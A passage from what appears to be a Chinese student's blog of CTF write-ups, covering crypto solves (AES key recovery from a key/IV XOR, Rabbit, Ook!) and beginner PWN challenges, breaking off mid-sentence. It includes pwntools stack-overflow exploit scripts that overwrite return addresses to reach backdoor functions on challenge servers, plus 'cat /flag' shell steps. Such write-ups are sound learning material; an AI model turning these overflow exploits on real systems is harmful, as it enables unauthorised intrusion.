class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'flag&#123;5f95ca93-1594-762d-ed0b-a9139692cb4a&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h4 id="ACTF新生赛2020-crypto-aes"><a href="#ACTF新生赛2020-crypto-aes" class="headerlink" title="[ACTF新生赛2020]crypto-aes"></a>[ACTF新生赛2020]crypto-aes</h4><p>给出的脚本大概就像是这样的，</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> os<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span>    iv <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">^</span> bytes_to_long<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">)</span>    aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    enc_flag <span class="token operator">=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span><span class="token string">b'FLAG'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>enc_flag<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里为什么随机的key和iv我们仍然是可以破解的呢？因为这个key是两个byte的重复，而且给出了key和iv的按位异或的值。并且这个异或是从右向左异或的，key的长度大于iv的长度，所以前面的很多位来说，异或后的值是等于key的，故此可得key、iv，亦可解密。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> os<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>key_iv <span class="token operator">=</span> <span class="token number">91144196586662942563895769614300232343026691029427747065707381728622849079757</span>enc_flag <span class="token operator">=</span> <span class="token string">b'\x8c-\xcd\xde\xa7\xe9\x7f.b\x8aKs\xf1\xba\xc75\xc4d\x13\x07\xac\xa4&amp;\xd6\x91\xfe\xf3\x14\x10|\xf8p'</span>key <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>key_iv<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span>iv <span class="token operator">=</span> key_iv <span class="token operator">^</span> bytes_to_long<span class="token punctuation">(</span>key<span class="token punctuation">)</span>iv <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>iv<span class="token punctuation">)</span>aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>flag <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>enc_flag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'actf&#123;W0W_y0u_can_so1v3_AES_now!&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h3><h4 id="ctfshow、crypto6"><a href="#ctfshow、crypto6" class="headerlink" title="ctfshow、crypto6"></a>ctfshow、crypto6</h4><p>提示为：<code>密钥为**加密方式**名称，区分大小写</code></p><pre class="line-numbers language-none"><code class="language-none">密文：U2FsdGVkX19mGsGlfI3nciNVpWZZRqZO2PYjJ1ZQuRqoiknyHSWeQv8ol0uRZP94MqeD2xz+密钥：加密方式名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种<code>U2Fsd</code>开头的一般就是那几种<code>对称加密</code>，这个对称加密有个专门的网站<a href="https://www.sojson.com/encrypt_aes.html">https://www.sojson.com/encrypt_aes.html</a></p><p>然后从aes一个一个地试试就好了。</p><p><img src="/2021/05/28/CTF/image-20210720145845078.png" alt></p><h4 id="ctfshow、crypto7"><a href="#ctfshow、crypto7" class="headerlink" title="ctfshow、crypto7"></a>ctfshow、crypto7</h4><p><strong>TAG: Ook!</strong></p><p><a href="https://ctf.bugku.com/tool/brainfuck">Ook在线网站</a></p><pre class="line-numbers language-none"><code class="language-none">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook?Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook.Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook. Ook.Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook!Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook. Ook? Ook. flag&#123;b615c4b79a1aede83b9ae67104ff4eb5&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210720150259583.png" alt></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><a href="https://zhuanlan.zhihu.com/p/129837931">kali配置安装pwn环境</a></p><h3 id="安装peda"><a href="#安装peda" class="headerlink" title="安装peda"></a>安装peda</h3><p>我先安装的是peda，直接就两个命令，下面的两个命令</p><pre class="line-numbers language-command" data-language="command"><code class="language-command">git clone https:&#x2F;&#x2F;github.com&#x2F;longld&#x2F;peda.git ~&#x2F;pedaecho &quot;source ~&#x2F;peda&#x2F;peda.py&quot; &gt;&gt; ~&#x2F;.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>直接gdb命令出现的就是peda的前缀了。</p><p><strong>对pwn的难度估计出现了重大失误，这个门槛还是很高的，等下学期学了病毒分析再入门吧。</strong></p><h2 id="一般pwn"><a href="#一般pwn" class="headerlink" title="一般pwn"></a>一般pwn</h2><h3 id="绝对签到题"><a href="#绝对签到题" class="headerlink" title="绝对签到题"></a>绝对签到题</h3><h4 id="buu、test-your-nc"><a href="#buu、test-your-nc" class="headerlink" title="buu、test_your_nc"></a>buu、test_your_nc</h4><p>直接nc就行了，这个主要是好像pwn里面经常是要使用nc工具的。</p><pre class="line-numbers language-none"><code class="language-none">nc node3.buuoj.cn 28024cat &#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210601121350820.png" alt="image-20210601121350820"></p><h2 id="普通溢出题目"><a href="#普通溢出题目" class="headerlink" title="普通溢出题目"></a>普通溢出题目</h2><h3 id="普通栈溢出"><a href="#普通栈溢出" class="headerlink" title="普通栈溢出"></a>普通栈溢出</h3><h4 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h4><p><img src="/2021/05/28/CTF/image-20210711195254351.png" alt></p><p>使用64位的ida解决。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// main函数的反汇编代码如下</span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+1h] [rbp-Fh] BYREF</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"please input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ok,bye!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>据判断，gets函数具有栈溢出漏洞</p><p><img src="/2021/05/28/CTF/image-20210714201214783.png" alt></p><p>s的大小限制为15位(F - 0 = F[F为10进制的15])，只要传入超过15个byte就会导致溢出，然后转到system函数(程序中的fun函数里面有system方法)，然后就再看看ida里面他的函数的开始地址<strong>0x401186</strong></p><p><img src="/2021/05/28/CTF/image-20210714202217709.png" alt></p><p>然后就认为我们的payload可以为如下</p><pre class="line-numbers language-none"><code class="language-none">b&quot;a&quot; * 15 + p64(0x401186)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>p64</strong>代表的是这个地址是64位机的地址pack 64 bits number。</p><pre class="line-numbers language-none"><code class="language-none">p32&#x2F;p64: 打包一个整数，分别打包为32位或64位u32&#x2F;u64: 解包一个字符串，得到整数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后写脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27897</span><span class="token punctuation">)</span>buf_1 <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">15</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401186</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;42bfbcd2-053e-4a41-8581-3a8e676a4c9a&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h4><p><strong>TAG：gets栈溢出漏洞，后门函数</strong></p><p>听说大家ida打开之前都会使用checksec来检查一下应用程序是否是有保护的，这里的checksec是可以直接下的，但是好像某个工具里面自带的也是有的，这里为了方便，先直接<code>sudo apt install checksec</code>来下载一下这个工具。</p><p>然后就是直接看ida了，main函数的内容为</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-80h] BYREF</span>  <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-40h] BYREF</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"-Warm Up-\n"</span><span class="token punctuation">,</span> <span class="token number">0xAuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"WOW:"</span><span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%p\n"</span><span class="token punctuation">,</span> sub_40060D<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">9uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">gets</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>应该是最后的这个v5的大小限制导致栈溢出的，然后再去看v5的容量为</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">-0000000000000040 var_40          db 64 dup(?)+0000000000000000  s              db 8 dup(?)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>是这个，<code>80-40=40(十六进制)</code>还要加上返回地址的8个字节，这里应该说的是return所造成的8个字节的返回地址。</p><p>估计就是64位的机器，然后一个字节等于8个位，所以64位=8×8位。就是8个字节。(猜想的，现在还不是很明白)</p><p><img src="/2021/05/28/CTF/image-20210717212917762.png" alt="后门函数所在地址为0x40060d"></p><p>然后就可以写出利用方式如下所示</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28074</span><span class="token punctuation">)</span>buf_1 <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x48</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40060d</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;02912f3b-c4e0-4a24-9f51-30a93e017b04&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>又是一道水题，并没学到更高深的东西。</p><h4 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h4><p><strong>TAG: gets栈溢出，满足条件</strong></p><p>又是一道gets的题，找到关键处的代码为</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> v1<span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>  <span class="token keyword">float</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-4h]</span>  v2 <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let's guess the number."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">11.28125</span> <span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    result <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Its value should be 11.28125"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>满足<code>v2 == 